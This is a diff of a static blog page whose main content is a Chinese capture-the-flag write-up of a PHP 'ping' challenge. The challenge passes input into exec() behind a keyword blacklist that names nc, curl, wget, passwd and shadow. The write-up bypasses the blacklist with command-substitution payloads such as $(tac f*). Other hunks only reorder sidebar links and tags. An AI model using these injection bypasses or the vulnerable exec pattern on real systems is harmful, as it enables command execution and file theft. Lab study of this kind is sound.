@@ -440,7 +440,7 @@ height:50vh;
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;.&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">        IP: &lt;input type=&quot;text&quot; name=&quot;ip&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;&lt;?php</span><br><span class="line">        $blacklist = [</span><br><span class="line">            &apos;flag&apos;, &apos;cat&apos;, &apos;nc&apos;, &apos;sh&apos;, &apos;cp&apos;, &apos;touch&apos;, &apos;mv&apos;, &apos;rm&apos;, &apos;ps&apos;, &apos;top&apos;, &apos;sleep&apos;, &apos;sed&apos;,</span><br><span class="line">            &apos;apt&apos;, &apos;yum&apos;, &apos;curl&apos;, &apos;wget&apos;, &apos;perl&apos;, &apos;python&apos;, &apos;zip&apos;, &apos;tar&apos;, &apos;php&apos;, &apos;ruby&apos;, &apos;kill&apos;,</span><br><span class="line">            &apos;passwd&apos;, &apos;shadow&apos;, &apos;root&apos;,</span><br><span class="line">            &apos;z&apos;,</span><br><span class="line">            &apos;dir&apos;, &apos;dd&apos;, &apos;df&apos;, &apos;du&apos;, &apos;free&apos;, &apos;tempfile&apos;, &apos;touch&apos;, &apos;tee&apos;, &apos;sha&apos;, &apos;x64&apos;, &apos;g&apos;,</span><br><span class="line">            &apos;xargs&apos;, &apos;PATH&apos;,</span><br><span class="line">            &apos;$0&apos;, &apos;proc&apos;,</span><br><span class="line">            &apos;/&apos;, &apos;&amp;&apos;, &apos;|&apos;, &apos;&gt;&apos;, &apos;&lt;&apos;, &apos;;&apos;, &apos;&quot;&apos;, &apos;\&apos;&apos;, &apos;\\&apos;, &quot;\n&quot;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(2);</span><br><span class="line"></span><br><span class="line">        function ping($ip) &#123;</span><br><span class="line">            global $blacklist;</span><br><span class="line"></span><br><span class="line">            if(strlen($ip) &gt; 15) &#123;</span><br><span class="line">                return &apos;IP toooooo longgggggggggg&apos;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                foreach($blacklist as $keyword) &#123;</span><br><span class="line">                    if(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        return &quot;&#123;$keyword&#125; not allowed&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(&quot;ping -c 1 \&quot;&#123;$ip&#125;\&quot; 2&gt;&amp;1&quot;, $ret);</span><br><span class="line">                return implode(&quot;\n&quot;, array_slice($ret, 0, 10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_GET[&apos;ip&apos;]))</span><br><span class="line">            echo htmlentities(ping($_GET[&apos;ip&apos;]));</span><br><span class="line">        else</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">    ?&gt;&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>发现 <code>$</code> 没有在黑名单内，还可以 ``</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span>(ls) / `ls`</span><br><span class="line">ping: flag.php </span><br><span class="line">index.php: Name or service not known</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> cat 被过滤了，但有一堆可以查看文件内容的命令啊</span><br><span class="line">tac  从最后一行开始显示，可以看出 tac 是 cat 的倒着写！ </span><br><span class="line">more 一页一页的显示档案内容 </span><br><span class="line">less 与 more 类似，但是比 more 更好的是，他可以往前翻页！ </span><br><span class="line">head 只看头几行 </span><br><span class="line">tail 只看尾巴几行 </span><br><span class="line">nl   显示的时候，顺道输出行号！</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 加个 * 模糊匹配一下</span><br><span class="line"><span class="meta">$</span>(tac f*)</span><br><span class="line">ping: $flag = 'FLAG&#123;ping_$(capture-the-flag)_U.....&#125;';</span><br><span class="line">&lt;?php: Name or service not known</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(ls) / `ls`</span></span><br><span class="line">ping: flag.php </span><br><span class="line">index.php: Name or service not known</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat 被过滤了，但有一堆可以查看文件内容的命令啊</span></span><br><span class="line">tac  从最后一行开始显示，可以看出 tac 是 cat 的倒着写！ </span><br><span class="line">more 一页一页的显示档案内容 </span><br><span class="line">less 与 more 类似，但是比 more 更好的是，他可以往前翻页！ </span><br><span class="line">head 只看头几行 </span><br><span class="line">tail 只看尾巴几行 </span><br><span class="line">nl   显示的时候，顺道输出行号！</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加个 * 模糊匹配一下</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(tac f*)</span></span><br><span class="line">ping: $flag = 'FLAG&#123;ping_$(capture-the-flag)_U.....&#125;';</span><br><span class="line">&lt;?php: Name or service not known</span><br></pre></td></tr></table></figure>
 
 <h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a><a href="https://hackme.inndy.tw/scoreboard" target="_blank" rel="noopener">scoreboard</a></h2><blockquote>
 <p><strong>DO NOT</strong> ATTACK or SCAN scoreboard, you don’t need to do that.</p>
@@ -1651,6 +1651,36 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 58
@@ -1873,12 +1903,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
         </li>
     
     
@@ -1937,12 +1967,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
         </li>
     
     
@@ -1980,15 +2010,15 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
-    
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
@@ -2006,6 +2036,8 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
     
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
@@ -2018,13 +2050,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
-    
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
-    
         <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
